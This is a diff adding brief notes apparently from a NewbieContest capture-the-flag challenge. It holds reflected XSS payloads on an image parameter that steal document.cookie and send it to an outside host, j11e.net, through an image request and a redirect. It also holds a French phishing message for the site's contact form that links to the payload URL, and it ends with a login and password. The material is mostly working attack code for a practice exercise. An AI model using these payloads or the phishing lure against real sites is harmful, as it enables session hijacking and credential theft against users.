@@ -1,0 +1,15 @@
+xss on i param in homepage URL
+    i=1.jpg%27%20onload=%27a=new%20Image%281,1%29;a.src=document.cookie;%20document.body.appendChild%28a%29;%27%20attri=%271
+
+    hacking.newbiecontest.org:10080/ep13/index.php?i=1.jpg' onload='b=document.cookie;a=new Image(1,1);a.src="http://j11e.net/?cookie=".concat(document.cookie); document.body.appendChild(a);' attri='1
+
+phising simulated from contact form:
+
+Salut,
+
+J'ai un petit problème. En effet, j'ai beau avoir mis à jour mon navigateur, je n'arrive pas à me connecter au site. Pouvez-vous m'aider s'il vous plaît ? 
+
+J'ai déjà essayé ce qu'il y a <a href="http://hacking.newbiecontest.org:10080/ep13/index.php?i=1.jpg'+onload='document.location=\"http://j11e.net/vol.php?cookie=document.cookie">ici</a> et ça a pas marché :/ 
+
+login=Nms; pass=groskoala
+
